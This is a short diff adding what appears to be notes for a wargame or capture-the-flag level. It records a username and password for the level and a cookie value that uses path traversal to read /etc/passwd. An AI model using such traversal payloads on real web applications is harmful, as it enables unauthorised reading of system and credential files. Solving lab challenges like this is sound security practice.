@@ -1,0 +1,3 @@
+Username: own7
+Password: own7
+$_COOKIE["UserDetails"] = '../../../../..//etc/passwd';
